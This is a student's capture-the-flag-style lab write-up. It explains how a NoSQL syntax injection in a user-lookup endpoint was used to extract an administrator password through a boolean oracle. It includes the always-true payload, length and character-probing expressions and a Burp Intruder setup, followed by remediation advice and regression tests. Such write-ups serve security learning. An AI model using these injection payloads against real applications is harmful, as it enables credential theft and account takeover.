# Lab: Exploiting NoSQL Injection to Extract Data

## Source

PortSwigger Web Security Academy: Exploiting NoSQL injection to extract data

## Goal

Use a NoSQL Syntax Injection vulnerability to recover the administrator password through a boolean oracle and log in as the administrator.

## Initial login

The provided normal user account was used to access the account area.

The first captured request was:

```http
POST /login
```

This was not the vulnerable request for the extraction task.

## Learning struggle: finding the real endpoint

### Attempt 1: login request

I first tested quote input in the login request because the lab goal involved a password.

Observed result:

- the application returned the normal invalid-credentials page,
- `200 OK` was not useful because invalid login also returned `200`.

Correction:

```text
The lab goal does not prove that the login endpoint is vulnerable.
```

### Attempt 2: visible account URL

I then tested:

```http
GET /my-account?id=wiener
```

Observed result:

- redirects,
- no useful injection evidence.

Correction:

The visible navigation URL was not the endpoint that returned user details.

### Discovery: background lookup request

Burp HTTP history showed:

```http
GET /user/lookup?user=wiener
```

Baseline response:

```json
{
  "username": "wiener",
  "email": "wiener@normal-user.net",
  "role": "user"
}
```

This was the real user lookup and the correct attack surface.

## Testing flow

### 1. Quote test

Request concept:

```text
/user/lookup?user=wiener'
```

Observed response:

```json
{
  "message": "There was an error getting user details"
}
```

Interpretation:

The quote affected backend query syntax.

### 2. Always-true condition

Request concept:

```text
wiener' || 1 || '
```

Observed response:

```json
{
  "username": "administrator",
  "email": "admin@normal-user.net",
  "role": "administrator"
}
```

Interpretation:

The always-true condition matched multiple documents. The lookup returned the administrator document, likely because it was the first matching record.

This did not automatically mean the current session became administrator. It proved that the lookup query was manipulated.

### 3. Password-length oracle

The injected expression tested a condition conceptually similar to:

```javascript
this.password.length == N
```

Burp Intruder tested possible values.

Observed result:

```text
length 8 -> administrator record returned
other tested lengths -> administrator record not returned
```

Conclusion:

```text
administrator password length = 8
```

### 4. Character extraction

The expression then tested:

```javascript
this.password[index] == 'letter'
```

Indexes:

```text
0-7
```

Candidate characters:

```text
a-z
```

JavaScript strings use zero-based indexing, so index `0` is the first character.

### 5. Intruder configuration

Two payload positions were used:

```text
password index
candidate letter
```

Attack type:

```text
Cluster Bomb
```

Reason:

Cluster Bomb tested every index with every candidate letter.

Pitchfork would pair values and would not test the complete combination set.

### 6. Response marker

A true condition returned the administrator JSON object.

A false condition returned a different user-not-found/error-style response.

This produced a reliable boolean oracle.

### 7. Completion

The extracted lab password was used to log in as the administrator and complete the lab.

The password is intentionally omitted from these notes. The useful learning outcome is the method and evidence, not a temporary lab secret.

## Encoding issue

An early Intruder request contained incorrect and repeated encoding such as `%u...` sequences.

The corrected request used normal URL percent-encoding.

Important characters included:

```text
space -> %20
&     -> %26
[     -> %5B
]     -> %5D
```

The exact request must be encoded once so that the backend receives the intended expression.

## Evidence summary

```text
/user/lookup?user=wiener
-> wiener JSON

/user/lookup?user=wiener'
-> controlled error

always-true condition
-> administrator JSON

password.length == 8
-> administrator JSON

password[index] == correct character
-> administrator JSON

password[index] == incorrect character
-> different response
```

## Vulnerability classification

```text
NoSQL Syntax Injection
Boolean-based blind data extraction
```

## Root cause

The user value was likely concatenated into a custom JavaScript-style MongoDB query expression.

The endpoint also exposed a stable response difference that could be used as an oracle for conditions about sensitive fields.

The presence of a queryable password field suggests unsafe credential handling in the lab design.

## Real impact

The issue allowed:

- unauthorised administrator record lookup,
- blind extraction of credential data,
- administrator account compromise.

## Developer remediation

- Do not concatenate input into `$where` or JavaScript query expressions.
- Use a built-in structured lookup with strict string validation.
- Retrieve users by exact validated username.
- Store passwords as secure hashes.
- Verify passwords using a password-hash verification function outside the database lookup.
- Do not return unnecessary privileged fields.
- Use controlled error responses.
- Add rate limiting and monitoring for repeated probes.

## Regression tests

- `user` must accept a primitive string only.
- Quotes and JavaScript syntax must not change lookup behaviour.
- An always-true condition must not return another account.
- Conditions involving password properties must not be evaluated.
- Password fields must not be queryable or returned.
- Repeated position/character probes must trigger rate limiting or detection.
- The endpoint must not expose database or interpreter errors.

## Main lessons

- Find the real processing endpoint before building payloads.
- Automate only after manually confirming a true/false oracle.
- A response difference can leak secrets even when the secret is never displayed.
- Wrong attempts should be recorded because they explain how the attack surface was identified.

## Status

**PASS**
